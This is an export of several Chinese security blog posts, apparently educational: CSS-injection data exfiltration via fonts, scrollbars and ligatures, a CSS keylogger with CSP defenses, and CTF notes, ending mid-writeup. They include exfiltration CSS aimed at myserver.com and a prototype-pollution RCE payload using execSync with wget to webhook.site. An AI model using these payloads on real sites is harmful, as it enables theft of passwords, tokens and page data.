的寬度縮減到只能顯示一個字元，這樣其他字元就會被放到第二行去，再搭配 ::first-line 這個 selector，就可以特別針對第一行做樣式的調整，像是這樣： &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;style> @font-face &#123; font-family: \"fa\"; src:local('Comic Sans MS'); font-style:monospace; unicode-range: U+41; &#125; div &#123; font-size: 0px; height: 40px; width: 20px; font-family: fa, \"Courier New\"; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; &#125; div::first-line&#123; font-size: 30px; &#125; &lt;/style> Secret: &lt;div>CBAD&lt;/div> &lt;/body> &lt;/html> 畫面上你就只會看到一個「C」的字元，因為我們先用 font-size: 0px 把所有字元的尺寸都設為 0，再用 div::first-line 去做調整，讓第一行的 font-size 變成 30px。換句話說，只有第一行的字元能看到，而現在的 div 寬度只有 20px，所以只會出現第一個字元。 接著，我們再運用剛剛學會的那招，去載入看看不同的字體。當我載入 fa 這個字體時，因為畫面上沒有出現 A，所以不會有任何變化。但是當我載入 fc 這個字體時，畫面上有 C，所以就會用 Comic Sans MS 來顯示 C，高度就會變高，scrollbar 就會出現，就可以利用它來發出 request，像這樣： div &#123; font-size: 0px; height: 40px; width: 20px; font-family: fc, \"Courier New\"; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; --leak: url(http://myserver.com?C); &#125; div::first-line&#123; font-size: 30px; &#125; div::-webkit-scrollbar &#123; background: blue; &#125; div::-webkit-scrollbar:vertical &#123; background: var(--leak); &#125; 那我們要怎麼樣不斷使用新的 font-family 呢？用 CSS animation 就可以做到，你可以用 CSS animation 不斷載入不同的 font-family 以及指定不同的 –leak 變數。 如此一來，我們就能知道畫面上的第一個字元到底是什麼。 知道了第一個字元以後，我們把 div 的寬度變長，例如說變成 40px，就能容納兩個字元，因此第一行就會是前兩個字，接著再用一樣的方式載入不同的 font-family，就能 leak 出第二個字元，詳細流程如下： 假設畫面上是 ACB 調整寬度為 20px，第一行只出現第一個字元 A 載入字體 fa，因此 A 用較高的字體顯示，出現 scrollbar，載入 scrollbar 背景，傳送 request 給 server 載入字體 fb，但是 B 沒有出現在畫面上，因此沒有任何變化。 載入字體 fc，但是 C 沒有出現在畫面上，因此沒有任何變化。 調整寬度為 40px，第一行出現兩個字元 AC 載入字體 fa，因此 A 用較高的字體顯示，出現 scrollbar，此時應該是因為這個背景已經載入過，所以不會發送新的 request 載入字體 fb，沒出現在畫面上，沒任何變化 載入字體 fc，C 用較高的字體顯示，出現 scrollbar 並且載入背景 調整寬度為 60px，ACB 三個字元都出現在第一行 載入字體 fa，同第七步 載入字體 fb，B 用較高的字體顯示，出現 scrollbar 並且載入背景 載入字體 fc，C 用較高的字體顯示，但因為已經載入過相同背景，不會發送 request 結束 從上面流程中可以看出 server 會依序收到 A, C, B 三個 reqeust，代表了畫面上字元的順序。而不斷改變寬度以及 font-family 都可以用 CSS animation 做到。 想要看完整 demo 的可以看這個網頁（出處：What can we do with single CSS injection?）：https://demo.vwzq.net/css2.html 這個解法雖然解決了「不知道字元順序」的問題，但依然無法解決重複字元的問題，因為重複的字元不會再發出 request。 大絕招：ligature + scrollbar先講結論，這一招可以解決上面所有問題，達成「知道字元順序，也知道重複字元」的目標，能夠偷到完整的文字。 要理解怎麼偷之前，我們要先知道一個專有名詞，叫做連字（ligature），在某些字型當中，會把一些特定的組合 render 成連在一起的樣子，如下圖（來源：wikipedia）： 那這個對我們有什麼幫助呢？ 我們可以自己製作出一個獨特的字體，把 ab 設定成連字，並且 render 出一個超寬的元素。接著，我們把某個 div 寬度設成固定，然後結合剛剛 scrollbar 那招，也就是：「如果 ab 有出現，就會變很寬，scrollbar 就會出現，就可以載入 request 告訴 server；如果沒出現，那 scrollbar 就不會出現，沒有任何事情發生」。 流程是這樣的，假設畫面上有 acc 這三個字： 載入有連字 aa 的字體，沒事發生 載入有連字 ab 的字體，沒事發生 載入有連字 ac 的字體，成功 render 超寬的畫面，scrollbar 出現，載入 server 圖片 server 知道畫面上有 ac 載入有連字 aca 的字體，沒事發生 載入有連字 acb 的字體，沒事發生 載入有連字 acc 的字體，成功 render，scrollbar 出現，傳送結果給 server server 知道畫面上有 acc 透過連字結合 scrollbar，我們可以一個字元一個字元，慢慢 leak 出畫面上所有的字，甚至連 JavaScript 的程式碼都可以！ 你知道，script 的內容是可以顯示在畫面上的嗎？ head, script &#123; display: block; &#125; 只要加上這個 CSS，就可以讓 script 內容也顯示在畫面上，因此我們也可以利用同樣的技巧，偷到 script 的內容！ 在實戰上的話，你可以用 SVG 搭配其他工具，在 server 端迅速產生字體，想要看細節以及相關程式碼的話，可以參考這篇：Stealing Data in Great style – How to Use CSS to Attack Web Application. 而這邊我就簡單做個簡化到不行的 demo，來證明這件事情是可行的。為了簡化，有人做了一個 Safari 版本的 demo，因為 Safari 支援 SVG font，所以不需要再從 server 產生字型，原始文章在這裡：Data Exfiltration via CSS + SVG Font - PoC (Safari only) 簡易版 demo： &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;body> &lt;script> var secret = \"abc123\" &lt;/script> &lt;hr> &lt;script> var secret2 = \"cba321\" &lt;/script> &lt;svg> &lt;defs> &lt;font horiz-adv-x=\"0\"> &lt;font-face font-family=\"hack\" units-per-em=\"1000\" /> &lt;glyph unicode='\"a' horiz-adv-x=\"99999\" d=\"M1 0z\"/> &lt;/font> &lt;/defs> &lt;/svg> &lt;style> script &#123; display: block; font-family:\"hack\"; white-space:n owrap; overflow-x: auto; width: 500px; background:lightblue; &#125; script::-webkit-scrollbar &#123; background: blue; &#125; &lt;/style> &lt;/body> &lt;/html> 我用 script 放了兩段 JS，裡面內容分別是 var secret = &quot;abc123&quot; 跟 var secret2 = &quot;cba321&quot;，接著利用 CSS 載入我準備好的字體，只要有 &quot;a 的連字，就會寬度超寬。 再來如果 scrollbar 有出現，我把背景設成藍色的，比較顯眼，最後的結果如下： 上面因為內容是 var secret = &quot;abc123&quot;，所以符合了 &quot;a 的連字，因此寬度變寬，scrollbar 出現。 下面因為沒有 &quot;a，所以 scrollbar 沒出現（有 a 的地方都會缺字，應該跟我沒有定義其他的 glyph 有關，但不影響結果） 只要把 scrollbar 的背景換成 URL，就可以從 server 端知道 leak 的結果。 如果想看實際的 demo 跟 server 端的寫法，可以參考上面附的那兩篇文章。 防禦方式最後我們來講一下防禦方式，最簡單明瞭的當然就是直接把 style 封起來不給用，基本上就不會有 CSS injection 的問題（除非實作方式有漏洞）。 如果真的要開放 style，也可以用 CSP 來阻擋一些資源的載入，例如說 font-src 就沒有必要全開，style-src 也可以設置 allow list，就能夠擋住 @import 這個語法。 再來，也可以考慮到「如果頁面上的東西被拿走，會發生什麼事情」，例如說 CSRF token 被拿走，最壞就是 CSRF，此時就可以實作更多的防護去阻擋 CSRF，就算攻擊者取得了 CSRF token，也沒辦法 CSRF（例如說多檢查 origin header 之類的）。 總結CSS 果真博大精深，真的很佩服這些前輩們可以把 CSS 玩出這麼多花樣，發展出這麼多令人眼界大開的攻擊手法。當初在研究的時候，利用屬性選擇器去 leak 這個我可以理解，用 unicode-range 我也能理解，但是那個用文字高度加上 CSS animation 去變化的，我花了不少時間才搞懂那在幹嘛，連字那個雖然概念好懂，但真的要實作還是會碰到不少問題。 最後，這兩篇文章主要算是介紹一下 CSS injection 這個攻擊手法，因此實際的程式碼並不多，而這些攻擊手法都參考自前人們的文章，列表我會附在下面，有興趣的話可以閱讀原文，會講得更詳細一點，如果對哪項攻擊想要深入了解，也可以留言跟我交流。 參考資料： CSS Injection Attacks CSS Injection Primitives HackTricks - CSS Injection Stealing Data in Great style – How to Use CSS to Attack Web Application. Data Exfiltration via CSS + SVG Font Data Exfiltration via CSS + SVG Font - PoC (Safari only) CSS data exfiltration in Firefox via a single injection point","link":"/2022/09/29/css-injection-2/"},{"title":"CSS keylogger：攻擊與防禦","text":"前言前陣子在 Hacker News 上面看到這篇：Show HN: A CSS Keylogger，大開眼界，決定要找個時間好好來研究一下，並且寫一篇文章分享給大家。 這篇會講到以下東西： 什麼是 keylogger CSS keylogger 的原理 CSS keylogger 與 React 防禦方法 好，那就讓我們開始吧！ Keylogger 是什麼？Keylogger 就是鍵盤側錄，是惡意程式的一種，拿來記錄你電腦上面所有按過的按鍵。還記得我小時候曾經用 VB6 寫了一個超簡單的 keylogger，只要呼叫系統提供的 API 並且記錄相對應的按鍵就好。 在電腦上面被裝這個的話，就等於你輸入的任何東西都被記錄起來。當然，也包含了帳號跟密碼。不過如果我沒記錯，防毒軟體的行為偵測應該可以把這些都擋掉，所以也不用太過擔心。 剛剛講的是在電腦上面，現在我們把範圍縮小，侷限在網頁。 如果你要在頁面上加一個 keylogger，通常會利用 JavaScript 來達成，而且程式碼超級簡單： document.addEventListener('keydown', e => &#123; console.log(e.key) &#125;) 只要偵測keydown事件並且抓出按下的 key 就行了。 不過假如你有能力在你想入侵的網頁上面加入 JavaScript 的話，通常也不需要這麼麻煩去記錄每個按鍵，你直接把 Cookie 偷走、竄改頁面、導到釣魚頁面，或者是在 submit 的時候把帳號密碼回傳給自己的 Server 就好，所以 keylogger 顯得不是那麼有用。 好，那假設我們現在沒辦法插入惡意的 JavaScript，只能改 CSS，有辦法用純 CSS 做出一個 keylogger 嗎？ 有，畢竟 CSS 能做的事情可多了。 純 CSS keylogger 的原理直接看程式碼你就懂了（取自：maxchehab&#x2F;CSS-Keylogging）： input[type=\"password\"][value$=\"a\"] &#123; background-image: url(\"http://localhost:3000/a\"); &#125; 神奇吧！ 如果你不熟悉 CSS selector，這邊幫你複習一下。上面那段意思就是說如果 type 是 password 的 input，value 以 a 結尾的話，背景圖就載入http://localhost:3000/a 。 現在我們可以把這串 CSS 改一下，新增大小寫英文字母、數字甚至是特殊符號，接著會發生什麼事呢？ 如果我輸入 abc123，瀏覽器就會發送 Request 到： http://localhost:3000/a http://localhost:3000/b http://localhost:3000/c http://localhost:3000/1 http://localhost:3000/2 http://localhost:3000/3 就這樣，你的密碼就完全被攻擊者給掌握了。 這就是 CSS keylogger 的原理，利用 CSS Selector 搭配載入不同的網址，就能夠把密碼的每一個字元發送到 Server 去。 看起來很可怕對吧，別怕，其實沒那麼容易。 CSS keylogger 的限制不能保證順序雖然你輸入的時候是按照順序輸入的，但 Request 抵達後端的時候並不能保證順序，所以有時候順序會亂掉。例如說 abc123 變成 bca213 之類的。 但如果我們把 CSS Selector 改一下的話，其實就能解決這個問題： input[value^=\"a\"] &#123; background-image: url(\"http://localhost:3000/a_\"); &#125; input[value*=\"aa\"] &#123; background-image: url(\"http://localhost:3000/aa\"); &#125; input[value*=\"ab\"] &#123; background-image: url(\"http://localhost:3000/ab\"); &#125; 如果開頭是 a，我們就送出a_，接著針對 26 個字母跟數字的排列組合每兩個字元送出一個 request，例如說：abc123，就會是： a_ ab bc c1 12 23 就算順序亂掉，透過這種關係你把字母重新組合起來，還是可以得到正確的密碼順序。 重複字元不會送出 Request因為載入的網址一樣，所以重複的字元就不會再載入圖片，不會發送新的 Request。這個問題目前據我所知應該是解不掉。 在輸入的時候，其實 value 不會變這個其實是 CSS Keylogger 最大的問題。 當你在 input 輸入資訊的時候，其實 input 的 value 是不會變的，所以上面講的那些完全不管用。你可以自己試試看就知道了，input 的內容會變，但是你用 dev tool 看的話，會發現 value 完全不會變。 針對這個問題，有兩個解決方案，第一個是利用 Webfont： &lt;!doctype html> &lt;title>css keylogger&lt;/title> &lt;style> @font-face &#123; font-family: x; src: url(./log?a), local(Impact); unicode-range: U+61; &#125; @font-face &#123; font-family: x; src: url(./log?b), local(Impact); unicode-range: U+62; &#125; @font-face &#123; font-family: x; src: url(./log?c), local(Impact); unicode-range: U+63; &#125; @font-face &#123; font-family: x; src: url(./log?d), local(Impact); unicode-range: U+64; &#125; input &#123; font-family: x, 'Comic sans ms'; &#125; &lt;/style> &lt;input value=\"a\">type `bcd` and watch network log （程式碼取自：Keylogger using webfont with single character unicode-range） value 不會跟著變又怎樣，字體總會用到了吧！只要每打一個字，就會送出相對應的 Request。 但這個方法的侷限有兩個： 沒辦法保證順序，一樣也沒辦法解決重複字元的問題 如果欄位是&lt;input type=&#39;password&#39; /&gt;，就沒有用 （在研究第二個侷限的時候發現一件有趣的事，由於 Chrome 跟 Firefox 會把「頁面上有 type 是 password 的 input，但是又沒用 HTTPS」的網站標示為不安全，所以有人研究出用普通 input 搭配特殊字體來躲過這個偵測，並且讓輸入框看起來像是 password（但其實 type 不是 password），在這種情形下就可以用 Webfont 來攻擊了） 再來我們看第二種解決方案，剛剛有說到這個問題的癥結點在於 value 不會變，換句話說，如果你 input 輸入值的時候，value 會跟著變的話，這個攻擊手法就很用了。 嗯…有沒有一種很熟悉的感覺。 class NameForm extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;value: ''&#125;; this.handleChange = this.handleChange.bind(this); &#125; handleChange(event) &#123; this.setState(&#123;value: event.target.value&#125;); &#125; render() &#123; return ( &lt;form> &lt;label> Name: &lt;input type=\"text\" value=&#123;this.state.value&#125; onChange=&#123;this.handleChange&#125; /> &lt;/label> &lt;/form> ); &#125; &#125; （以上程式碼改寫自React 官網） 如果你用過 React 的話，應該會很熟悉這個模式。你在輸入任何東西的時候，會先改變 state，再把 state 的值對應到 input 的 value 去。因此你輸入什麼，value 就會是什麼。 React 是超夯的前端 Library，可以想像有一大堆網頁都是用 React 做的，而且只要是 React，幾乎就能保證 input 的 value 一定會同步更新（幾乎啦，但應該還是有少數沒有遵循這個規則）。 在這邊先做個總結，只要你 input 的 value 會對應到裡面的值（假如你用 React，幾乎一定會這樣寫），並且有地方可以讓別人塞入自訂的 CSS 的話，就能成功實作出 CSS Keylogger。雖然有些缺陷（沒辦法偵測重複字元），但概念上是可行的，只是精準度沒那麼高。 React 的回應React 的社群也有針對這一個問題進行討論，都在 Stop syncing value attribute for controlled inputs #11896 這個 Issue 裡。 事實上，讓 input 的 value 跟輸入的值同步這件事情一直都會有一些 bug，以前甚至發生了知名流量分析網站 Mixpanel 不小心記錄敏感資訊的事件，而最根本的原因就是因為 React 會一直同步更新 value。 Issue 的討論滿值得一看的，裡面有提到大家常搞混的一件事情：Input 的 attributes 跟 properties。我找到 Stackover flow 上面一篇不錯的解釋：What is the difference between properties and attributes in HTML? attributes 基本上就是你 HTML 上面的那個東西，而 properties 代表的是實際的 value，兩個不一定會相等，舉例來說： &lt;input id=\"the-input\" type=\"text\" value=\"Name:\"> 假如你今天抓這個 input 的 attribute，你會得到Name:，但如果你今天抓 input 的 value，你會得到目前在輸入框裡面的值。所以其實這個 attribute 就跟我們常用的 defaultValue 是一樣的意思，就是預設值。 不過在 React 裡面，他會把 attribute 跟 value 同步，所以你 value 是什麼，attribute 就會是什麼。 從討論看起來，在 React 17 滿有機會把這個機制拿掉，讓這兩者不再同步。 防禦方法上面講了這麼多，因為現今 React 還沒把這個改掉，所以問題還是存在著。而且其實除了 React，也可能有別的 Library 做了差不多的事情。 Client 端的防禦方法我就不提了，基本就是裝一些別人寫好的 Chrome Extension，可以幫你偵測符合模式的 CSS 之類的，這邊比較值得提的是 Server 端的防禦。 目前看起來最一勞永逸的解決方案就是 Content-Security-Policy，簡而言之它是一個 HTTP Response 的 header，用來決定瀏覽器可以載入哪些資源，例如說禁止 inline 程式碼、只能載入同個 domain 下的資源之類的。 這個 Header 的初衷就是為了防止 XSS 以及攻擊者載入外部的惡意程式碼（例如說我們這個 CSS keylogger）。想知道更詳細的用法可以參考這篇：Content-Security-Policy - HTTP Headers 的資安議題 (2) 總結不得不說，這個手法真的很有趣！之前第一次看到的時候也驚嘆了好一陣子，居然能發現這樣子的純 CSS Keylogger。雖然技術上是可行的，但在實作上還是會碰到許多困難之處，而且要符合滿多前提才能做這樣子的攻擊，不過還是很值得關注後續的發展。 總之呢，這篇文就是想介紹這個東西給讀者們，希望大家有所收穫。 參考資料 Keylogger using webfont with single character unicode-range #24 Stop syncing value attribute for controlled inputs #11896 maxchehab&#x2F;CSS-Keylogging Content-Security-Policy - HTTP Headers 的資安議題 (2) Bypassing Browser Security Warnings with Pseudo Password Fields CSS Keylogger (and why you shouldn’t worry about it) Mixpanel JS library has been harvesting passwords","link":"/2018/03/12/css-keylogger/"},{"title":"幾個與 Web 跟 JS 相關的 CTF 題目小記","text":"前陣子有幾個 CTF 都很不錯，像是 SECCON 跟 HITCON，但可惜我前陣子剛好出國玩了，回來以後就懶得寫完整 writeup 了。原本其實連記下來都懶得記，可是一旦時間久了，要找相關的資料就會變得很難找，所以還是決定簡單記一下。 除此之外，順便記一下幾題我覺得以前應該要記下來，但不知道為什麼卻沒記下來的題目。 關鍵字： Node.js prototype pollution gadget to RCE (Balsn CTF 2022 - 2linenodejs) 取得 JS proxy 的原始值 (corCTF 2022 - sbxcalc) 瀏覽器 back 行為的 cache (SECCON CTF 2022 - spanote) 利用 svg 做出同步的 XSS (HITCON CTF 2022) 讀到 shadow DOM 的資料 (HITCON CTF 2022) Balsn CTF 2022 - 2linenodejs程式碼十分簡單： #!/usr/local/bin/node process.stdin.setEncoding('utf-8'); process.stdin.on('readable', () => &#123; try&#123; console.log('HTTP/1.1 200 OK\\nContent-Type: text/html\\nConnection: Close\\n'); const json = process.stdin.read().match(/\\?(.*?)\\ /)?.[1], obj = JSON.parse(json); console.log(`JSON: $&#123;json&#125;, Object:`, require('./index')(obj, &#123;&#125;)); &#125;catch (e) &#123; require('./usage') &#125;finally&#123; process.exit(); &#125; &#125;); // index module.exports=(O,o) => ( Object.entries(O).forEach( ([K,V])=>Object.entries(V).forEach( ([k,v])=>(o[K]=o[K]||&#123;&#125;,o[K][k]=v) ) ), o ); 很明顯有個 prototype pollution 的洞，因此這題考的就是你在 node.js 有了 prototype pollution 以後，要怎麼弄到 RCE。 這邊還有一個關鍵是 catch 裡面的 require(&#39;./usage&#39;) 最後一個關鍵是這篇論文：Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js，裡面提到很多從原型污染打到 RCE 的案例，然後都有附上 gadget 或是一些提示。 不過論文裡的其中一個洞在這題用的版本已經被修掉了：https://github.com/nodejs/node/blob/v18.8.0/lib/internal/modules/cjs/loader.js#L484 const &#123; 1: name, 2: expansion = '' &#125; = RegExpPrototypeExec(EXPORTS_PATTERN, request) || kEmptyObject; kEmptyObject 是 ObjectFreeze(ObjectCreate(null))，所以不會被污染了。 但總之在檔案裡面繼續找一找，就會發現另一個 trySelf 的 function 有同個問題，在這裏：https://github.com/nodejs/node/blob/c200106305f4367ba9ad8987af5139979c6cc40c/lib/internal/modules/cjs/loader.js#L454 const &#123; data: pkg, path: pkgPath &#125; = readPackageScope(parentPath) || &#123;&#125;; 這邊預設值也用了 &#123;&#125;，所以可以透過原型污染去干擾這些值。 下面這一段程式碼，會去載入 ./pwn.js 而不是 ./usage.js： Object.prototype[\"data\"] = &#123; exports: &#123; \".\": \"./pwn.js\" &#125;, name: './usage.js' &#125; Object.prototype[\"path\"] = './' require('./usage.js') 因此透過原型污染，可以達成 require 任意文件。接下來的任務就是去找出哪個內建文件有可以使用的 payload，隊友找到 /opt/yarn-v1.22.19/preinstall.js，最後長這樣： Object.prototype[\"data\"] = &#123; exports: &#123; \".\": \"./preinstall.js\" &#125;, name: './usage' &#125; Object.prototype[\"path\"] = '/opt/yarn-v1.22.19' Object.prototype.shell = \"node\" Object.prototype[\"npm_config_global\"] = 1 Object.prototype.env = &#123; \"NODE_DEBUG\": \"console.log(require('child_process').execSync('wget$&#123;IFS&#125;https://webhook.site/a0beafdc-df63-4804-85a8-7945ad473bf5?q=2').toString());process.exit()//\", \"NODE_OPTIONS\": \"--require=/proc/self/environ\" &#125; require('./usage.js') 別人寫的 writeup： https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs corCTF 2022 - sbxcalc這題最核心的部分可以看成是這樣： var p = new Proxy(&#123;flag: window.flag || 'flag'&#125;, &#123; get: () => 'nope' &#125;) 試問要怎麼拿到被 proxy 擋住的 flag？ 答案是 Object.getOwnPropertyDescriptor。 Object.getOwnPropertyDescriptor(p, &#39;flag&#39;)，這樣就可以拿到原始的值，而不是 proxy 處理後的東西。 作者 writeup: https://brycec.me/posts/corctf_2022_challenges#sbxcalc SECCON CTF 2022 Quals - spanoteChrome 裡面有一種 cache 叫做 back&#x2F;forward cache，簡稱 bfcache，這詞我還是第一次聽到：http://web.dev/articles/bfcache 第二個 disk cache 應該大家都比較熟悉了，fetched resourced 會存在裡面。 利用這個 bfcache，可以做出很有趣的行為。 現在有一個 API 是這樣： fastify.get(\"/api/notes/:noteId\", async (request, reply) => &#123; const user = new User(request.session.userId); if (request.headers[\"x-token\"] !== hash(user.id)) &#123; throw new Error(\"Invalid token\"); &#125; const noteId = validate(request.params.noteId); return user.sendNote(reply, noteId); &#125;); 雖然是個 GET，但是會檢查 custom header，因此照理來說直接用瀏覽器訪問是看不了的。 但是搭配剛剛講到的 cache 行為，你可以： 用瀏覽器打開 /api/notes/id，出現錯誤畫面 用同一個 tab 去到首頁，此時首頁會用 fetch 搭配 custom header 去抓 /api/notes/id，瀏覽器會把結果存在 disk cache 內 上一頁，此時畫面會顯示 disk cache 的結果 就可以用瀏覽器直接瀏覽 cached response，繞過了 custom header 的限制。 整題更詳細的 writeup 可以看這邊：https://blog.arkark.dev/2022/11/18/seccon-en/#web-spanote HITCON CTF 2022先貼一下 maple 跟 splitline 的 writeup： https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202022 https://blog.splitline.tw/hitcon-ctf-2022/ 這次只有稍微看了一下 Self Destruct Message 那一題，簡單講一下幾個考點。 第一個是執行 element.innerHTML = str 的時候，通常 HTML 裡面有什麼東西都會是非同步執行，例如說： element.innerHTML = '&lt;img src=x onerror=console.log(1)>' console.log(2) 絕對是先 log 2 再來才是 1。 但如果你這樣子寫： const div = document.createElement('div') div.innerHTML = '&lt;svg>&lt;svg onload=console.log(1)>' console.log(2) 就會很神奇的變成 1 在前面，而且這個 div 甚至不需要放到 DOM 裡面也會有作用。相關的討論可以看這一串：https://twitter.com/terjanq/status/1421093136022048775 再來就是可以利用 error stack 去找出原本的 location，拿到 flag id： window.addEventListener('unhandledrejection', e => &#123; console.log(e.reason.stack.match(/\\/message\\/(\\w+)/)[1]); &#125;); 然後這題也有別的解法，雖然說元素是放在 shadow DOM 裡面，但是可以透過一些 xsleak 去偷出 flag，更完整的研究在這邊：The Closed Shadow DOM 類似題目有出現在 DiceCTF 2022，我有寫過一篇心得但是那時候還沒開始標關鍵字：https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/","link":"/2022/12/08/ctf-js-notes/"},{"title":"DEF CON CTF 2022 Qualifier 筆記","text":"今年的 DEF CON CTF 資格賽跟去年差不多，都是 binary 相關的題目居多，而且今年的需要一堆 reverse 知識，像我這種基本上不會 reverse 的只能在一旁發呆外加幫隊友加油。 不過今年唯一的 web 題（叫做 Discoteq）我倒是覺得滿有趣的，難度不高但滿考驗 debug 跟觀察力以及迅速上手一個新東西的能力，我覺得考的是基本功，而不是對某個語言或是框架的知識，這點還滿棒的。 因為今年就只有這一題好寫，換個方式寫寫看好了，我來照著時間軸寫一下當時解題的想法，時間後面代表從題目釋出過了多久。 17:40 題目釋出17:44(4m) 開始看題開始號招隊友一起來看題目，我自己也開始觀察了一下。 這題 Discoteq 基本上就是一個聊天的網站，註冊登入之後可以發送訊息，在接收跟發送訊息的部分都是透過 websocket 來溝通。 除了一般的文字訊息以外，也可以發起投票。 接著主要就是熟悉一下這個網頁在幹嘛，發現沒太多功能以後，我就開始看起 source code。話說這題沒有提供 source code，但畢竟是前端嘛，所以就用 devtool 加減看一下，沒有太多的混淆或是加密，所以可讀性還是滿高的。 17:54(14m) 初步想法這時候我在 source code 裡面用 /api 跟 /flag 當關鍵字找到一個 API 的 endpoint 叫做 POST /api/flag，如果是 admin 身份就可以打這個 API 拿到 flag，從底下截圖中也可以發現程式裡面有個 AdminPage： 然後這題又有一個 admin bot 會看你的訊息，所以我推測這題可能是要 XSS &#x3D;&gt; 拿到 admin token（存在 localStorage） &#x3D;&gt; 打 API 拿 flag。 不過實際做法還不知道從何下手，繼續看 code。 18:09(29m) 發現漏洞以及猜測完整攻擊鍊繼續玩了一陣子，注意到一個漏洞，那就是送出訊息時的 JSON 長這樣： &#123; \"type\": \"widget\", \"widget\": \"/widget/chatmessage\", \"author\": &#123; \"user\": \"ewfwefoenfof32of&lt;h1 a=\\\">test&lt;/h1#ab525155\", \"platform\": \"web\" &#125;, \"recipients\": [ \"qdqwd\", \"admin#13371337\" ], \"data\": &#123; \"message\": \"hello\" &#125; &#125; 送出訊息後，會發現瀏覽器發出一個 request 去 https://example.com/widget/chatmessage 拿資料，response 如下： 文字版： þRFW\u0003\u0002\u0004core\u0007widgets\u0002\u0004core\bmaterial\u0001\u0005local\u0001\u0004root\u0001\u0006loaded Container\u0001\u0005child \u0006Column\u0001\bchildren\u0005\u0003 \u0003Row\u0001\bchildren\u0005\u0002 \u0004Text\u0001\u0004text\u0004\u0005From \u0004Text\u0002\u0004text \u0002\u0004\u0006author\u0004\u0004user\u0005style\u0007\u0001\u0005color\u0002Êÿ \u0007Padding\u0002\u0007padding\u0005\u0004\u0003\u0003\u0014@\u0003\u0003\u0005child \u0004Text\u0001\u0004text \u0002\u0004\u0004data\u0004\u0005title\u000f \u0001\u0004\u0006loaded\u0002\u0001 \u0006Column\u0001\bchildren\u0005\u0002\b \u0001\u0004poll_options \u0003Row\u0001\bchildren\u0005\u0002 \u0007Padding\u0002\u0005child \u000eElevatedButton\u0002\u0005child \u0004Text\u0001\u0004text\u0001\u0004\u0004text onPressed\u000e\bapi_post\u0002\u0004path \u0002\u0004\u0004data\u0004\u0007apiVote\u0004body\u0007\u0001 selection\u0001\u0004\u0004text\u0007padding\u0005\u0004\u0003\u0003\u0014@\u0003$@\u0003 \u0004Text\u0001\u0004text\u0001\u0004\u0005count TextButton\u0002\u0005child \u0004Text\u0002\u0004text\u0004\u0007Refresh\u0005style\u0007\u0001\u0005color\u0002ÿÿ onPressed\u0011\u0001\u0004\u0006loaded\u0010 ApiMapper\u0004\u0003url \u0002\u0004\u0004data\u0004\u0006apiGet\u0007jsonKey\u0004\u0007options\u0007dataKey\u0004poll_options\bonLoaded\u0011\u0001\u0004\u0006loaded\u0001 看起來是某種經過序列化的東西，而如果我把 widget 的內容改成 .huli.tw/test，瀏覽器就會去 https://example.com.huli.tw/test 抓東西，因此這邊可以操控 JS 要去哪邊拿這個經過序列化的東西。除了用 .huli.tw 以外，也可以用 @huli.tw，把前面變成 username 的一部分，這樣就不用額外再設一個 domain，比較方便。 因此我猜測這題就是： 找到怎麼產生這個 widget 用 widget 來 XSS（例如說加上 &lt;script&gt; 或是其他 XSS payload） 讓 admin bot 載入你的 widget 拿到 admin token 打 API 拿 flag 因此接下來就是要去看怎麼產生這個 widget，繼續在 source code 裡面找資料。 18:26(46m) 繼續研究 source code在原始碼裡面發現有一個叫做 getChatWidget 的函式就是拿來載入 widget 的，不過需要一點時間研究裡面在幹嘛。 18:35(55m) 確認載入方式此時確認是一套叫做 rfw 的東西，全稱為 Remote Flutter Widgets。雖然說早在我發現是遠端載入元件時就有用 Google 找到這一套，隊友也有找到這一套，但之前沒有證據所以不敢確認，我怕找錯方向。 之所以後來能確認是因為這邊的程式碼：https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/binary.dart#L32 /// The first four bytes of a Remote Flutter Widgets binary library blob. /// /// This signature is automatically added by [encodeLibraryBlob] and is checked /// in [decodeLibraryBlob]. /// /// See also: /// /// * [dataBlobSignature], which is the signature for binary data blobs. const List&lt;int> libraryBlobSignature = &lt;int>[0xFE, 0x52, 0x46, 0x57]; 這四個 bytes 跟前面看到的 remote widget 吻合，所以確認是用這一套產生的。 接下來就是要研究一下 Flutter 怎麼寫，然後看一下怎麼產生 widget，然後光是把 flutter SDK 裝起來就花了一些時間XD 19:03(1h 23m) 解碼 widget其實 rfw 沒什麼文件，直接看 example 比較快。從 example 裡面找到了把 widget encode&#x2F;decode 的程式碼，修改一下之後就可以拿來 decode 我們的 /widget/chatmessage，內容是這樣： widget root = Container(&#123; child: Column(&#123; children: [Row(&#123; children: [Text(&#123; text: From &#125;), Expanded(&#123; child: Text(&#123; text: data.author.user, style: &#123; color: 4278230474 &#125; &#125;) &#125;)] &#125;), Row(&#123; children: [Expanded(&#123; child: Text(&#123; text: data.data.message &#125;) &#125;)] &#125;)] &#125;) &#125;); 拿來 decode 的程式碼： import 'dart:io'; import 'package:rfw/formats.dart'; void main () async &#123; final File currentFile = File('chatmessage'); print(decodeLibraryBlob(await currentFile.readAsBytes())); &#125; 此時我研究的方向是「如何寫一個可以 XSS 的 flutter widget」，我原本想的路有三條： 直接寫入 HTML，像是 React 那樣 直接寫 JS code，例如說 widget 的 onload 事件可以 eval() 之類的 用 iframe src 或是 srcdoc 來 XSS 本來想說很簡單嘛，現在就只要找到怎麼在 flutter 裡面塞任意 HTML 就結束了，不過越研究越發現好像不是這麼簡單。原本以為 flutter 是像 React&#x2F;Vue 那樣，後來才發現是有一整套自己的系統跟語法，是完全不同的東西。 你沒辦法寫 HTML，也沒辦法寫 JS，儘管 iframe 可以用，但那要引入別的 library，用在這題會出錯。 不過因為這時也沒有別的線索，就繼續朝這條路研究。 19:37(1h 57m) 去吃飯原本想說吃完飯前解完的，太天真。 20:12(2h 32m) 吃完飯回來繼續戰鬥20:26(2h 46m) 找到正確的方向此時因為插入 HTML&#x2F;JS 的路似乎走不通，所以我在想是不是我想錯了方向，這題應該要借助一些現有的機制。 而剛好這個時候隊友也請我幫忙 decode poll widget，看到內容以後就確定這方向才是對的： widget root = Container(&#123; child: Column(&#123; children: [Row(&#123; children: [Text(&#123; text: From &#125;), Text(&#123; 